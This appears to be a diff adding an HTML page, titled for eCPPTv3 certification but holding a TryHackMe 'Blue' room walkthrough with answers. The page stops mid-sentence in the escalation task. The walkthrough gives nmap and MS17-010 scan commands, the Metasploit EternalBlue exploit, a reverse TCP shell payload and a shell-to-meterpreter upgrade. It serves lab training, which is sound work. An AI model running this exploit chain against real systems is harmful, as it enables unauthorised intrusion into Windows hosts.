@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eCPPTv3 Certification: The Good, the Bad, and the Lessons Learned</title>
+    <style>
+        /* General Body Styling */
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            line-height: 1.8;
+            margin: 0;
+            padding: 0;
+            background-color: #0d1117; /* Dark background */
+            color: #c9d1d9; /* Light text color */
+        }
+
+        /* Container Styling */
+        .container {
+            width: 85%;
+            margin: 30px auto;
+            padding: 20px;
+            background: #161b22; /* Slightly lighter dark for container */
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Header Styling */
+        h1, h2 {
+            color: #4a90e2; /* Softer blue for headings */
+            border-left: 5px solid #4a90e2;
+            padding-left: 10px;
+            text-shadow: 0 0 1px #4a90e2; /* Reduced glow */
+        }
+
+        /* Paragraph Styling */
+        p {
+            margin-bottom: 15px;
+        }
+
+        /* Unordered List Styling */
+        ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+
+        /* Code-style Tool & Wordlist Highlighting */
+        .highlight {
+            color: #ffa657; /* Orange for highlights */
+            font-weight: bold;
+        }
+
+        /* Section Divider */
+        .section {
+            margin-bottom: 30px;
+        }
+
+        /* Footer Styling */
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #8b949e;
+        }
+
+        /* Link Styling */
+        a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Add an animated glow effect to headers */
+        h1, h2 {
+            text-shadow: 0 0 0.5px #58a6ff, 0 0 2px #58a6ff;
+        }
+    </style>
+</head>
+<body>
+    <h1>TryHackMe — Blue WriteUp/Walkthrough with Answers</h1>
+    <p>Beginner-friendly Writeup/Walkthrough of the room Blue from TryHackMe with answers. You can find the room <a href="https://tryhackme.com/room/blue">here</a>.</p>
+
+    <div class="task">
+        <h2>Task 1: Recon</h2>
+        <h3>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)</h3>
+        <p>We run the following nmap scan:</p>
+        <pre><code>nmap -sS -Pn -A -p- -T5 $ip</code></pre>
+        <div class="answer">
+            <strong>Answer:</strong> No answer needed
+        </div>
+
+        <h3>How many ports are open with a port number under 1000?</h3>
+        <p>We get 3 ports opened under the port 1000.</p>
+        <div class="answer">
+            <strong>Answer:</strong> 3
+        </div>
+
+        <h3>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067)</h3>
+        <p>To find this we will use a nmap script to find if the machine is vulnerable:</p>
+        <pre><code>nmap -Ss -Pn -p 445 $ip --script smb-vuln-ms17-010.nse</code></pre>
+        <p>And we find that it is vulnerable to ms17–010:</p>
+        <div class="answer">
+            <strong>Answer:</strong> ms17–010
+        </div>
+    </div>
+
+    <div class="task">
+        <h2>Task 2: Gain Access</h2>
+        <h3>Start Metasploit</h3>
+        <p>We run the command msfconsole to start metasploit.</p>
+        <div class="answer">
+            <strong>Answer:</strong> No answer needed
+        </div>
+
+        <h3>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)</h3>
+        <p>We can now search for ms17–010:</p>
+        <pre><code>search ms17-010</code></pre>
+        <p>And.. we find it, its the first one.</p>
+        <div class="answer">
+            <strong>Answer:</strong> exploit/windows/smb/ms17_010_eternalblue
+        </div>
+
+        <h3>Show options and set the one required value. What is the name of this value? (All caps for submission)</h3>
+        <p>We use the command options to show all the options:</p>
+        <p>We can see the one required field we need to fill is RHOSTS.</p>
+        <div class="answer">
+            <strong>Answer:</strong> RHOSTS
+        </div>
+        <p>We now set the RHOSTS to the machine ip:</p>
+
+        <h3>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</h3>
+        <p>We set the payload specified:</p>
+        <pre><code>set payload windows/x64/shell/reverse_tcp</code></pre>
+        <div class="answer">
+            <strong>Answer:</strong> No answer needed
+        </div>
+
+        <h3>With that done, run the exploit!</h3>
+        <p>Now we can run the exploit, with the command:</p>
+        <pre><code>run</code></pre>
+        <div class="answer">
+            <strong>Answer:</strong> No answer needed
+        </div>
+
+        <h3>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</h3>
+        <p>And eventually after a bit of waiting we finally get a shell.</p>
+        <div class="answer">
+            <strong>Answer:</strong> No answer needed
+        </div>
+    </div>
+
+    <div class="task">
+        <h2>Task 3: Escalate</h2>
+        <h3>If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h3>
+        <p>We now send our session to the background and convert our shell to meterpreter to do this we first search for shell_to_meterpreter:</p>
+        <pre><code>search shell_to_meterpreter</code></pre>
+        <div class="answer">
+            <strong>Answer:</strong> post/multi/manage/shell_to_meterpreter
+        </div>
+
+        <h3>Select this (use MODULE_PATH). Show options, what option are we required to change?</h3>
+        <p>We can see that we need to set the SESSION:</p>
+        <div class="answer">
+            <strong>Answer:</strong> SESSION
+        </div>
+
+        <h3>Set the required option, you may need to list all of the sessions to find your target here.</h3>
+        <p>I also set the LHOST to our machine’s ip:</p>
+        <div class="answer">
+            <strong>Answer:</strong> No answer needed
+        </div>
+
+        <h3>Run! If this doesn’t work, try completing the 
